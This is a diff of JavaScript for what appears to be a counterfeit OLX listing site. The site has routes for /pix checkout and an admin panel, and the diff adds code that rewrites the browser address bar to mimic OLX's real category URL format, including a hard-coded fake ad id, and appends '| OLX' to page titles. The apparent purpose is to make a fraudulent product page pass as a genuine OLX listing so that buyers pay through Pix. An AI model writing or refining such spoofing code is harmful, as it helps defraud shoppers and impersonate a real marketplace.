@@ -25,9 +25,55 @@
     const path = window.location.pathname;
 
     // ----------------------------------------------------
-    // 1. PRODUCT PAGE (PC & MOBILE: index.html / iphone-17-branco-olx.html / mobile.html / /)
+    // 1. PRODUCT PAGE (All category URLs, PC & MOBILE: index.html / iphone-17-branco-olx.html / mobile.html / /)
     // ----------------------------------------------------
-    if (path === '/' || path.includes('iphone-17-branco-olx.html') || path === '/index.html' || path.includes('mobile.html') || path === '') {
+    const isSpecialPage = path.startsWith('/checkout') || path.startsWith('/pix') || path.startsWith('/perfil') || path.startsWith('/9bkp') || path.startsWith('/admin') || path.startsWith('/api');
+    if (!isSpecialPage) {
+        // Update URL to official OLX category format if at root or generic path
+        try {
+          if ((path === '/' || path === '/index.html' || path === '/iphone-17-branco-olx.html' || path === '') && p.title) {
+            const loc = (p.location || '').toLowerCase();
+            let stateRegion = 'estado-sp/sao-paulo-e-regiao';
+            if (loc.includes('rio de janeiro') || loc.includes('rj')) stateRegion = 'estado-rj/rio-de-janeiro-e-regiao';
+            else if (loc.includes('minas gerais') || loc.includes('mg') || loc.includes('belo horizonte')) stateRegion = 'estado-mg/belo-horizonte-e-regiao';
+            else if (loc.includes('parana') || loc.includes('pr') || loc.includes('curitiba')) stateRegion = 'estado-pr/curitiba-e-regiao';
+            else if (loc.includes('rio grande do sul') || loc.includes('rs') || loc.includes('porto alegre')) stateRegion = 'estado-rs/porto-alegre-e-regiao';
+            else if (loc.includes('bahia') || loc.includes('ba') || loc.includes('salvador')) stateRegion = 'estado-ba/salvador-e-regiao';
+
+            const cat = (p.category || '').toLowerCase();
+            let categorySlug = 'eletrodomesticos/geladeiras-e-freezers';
+            if (cat.includes('geladeira') || cat.includes('freezer') || cat.includes('fogão') || cat.includes('lavadora') || cat.includes('micro-ondas') || cat.includes('eletrodom')) {
+              categorySlug = 'eletrodomesticos/geladeiras-e-freezers';
+            } else if (cat.includes('celular') || cat.includes('smartphone') || cat.includes('iphone') || cat.includes('telefonia')) {
+              categorySlug = 'celulares-e-telefonia/celulares-e-smartphones';
+            } else if (cat.includes('game') || cat.includes('jogos') || cat.includes('console') || cat.includes('playstation') || cat.includes('xbox')) {
+              categorySlug = 'videogames/consoles';
+            } else if (cat.includes('informatica') || cat.includes('computador') || cat.includes('notebook')) {
+              categorySlug = 'informatica/computadores-e-acessorios';
+            } else if (cat.includes('audio') || cat.includes('tv') || cat.includes('video')) {
+              categorySlug = 'audio-tv-video-e-fotografia';
+            } else if (cat.includes('moveis') || cat.includes('móveis')) {
+              categorySlug = 'moveis/outros-moveis';
+            } else if (cat.includes('carro') || cat.includes('auto') || cat.includes('veiculo') || cat.includes('veículo')) {
+              categorySlug = 'autos-e-pecas/carros-vans-e-utilitarios';
+            } else {
+              const cleanCat = cat.normalize('NFD').replace(/[\u0300-\u036f]/g, '').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
+              categorySlug = cleanCat || 'eletrodomesticos/geladeiras-e-freezers';
+            }
+
+            const titleSlug = (p.title || 'anuncio-olx')
+              .normalize('NFD')
+              .replace(/[\u0300-\u036f]/g, '')
+              .toLowerCase()
+              .replace(/[^a-z0-9]+/g, '-')
+              .replace(/^-+|-+$/g, '')
+              .slice(0, 90);
+
+            const realUrl = `/${stateRegion}/${categorySlug}/${titleSlug}-1541067591`;
+            window.history.replaceState(null, '', realUrl + window.location.search);
+          }
+        } catch(e) {}
+
         // Title
         if (p.title) {
           document.title = p.title + ' | OLX';
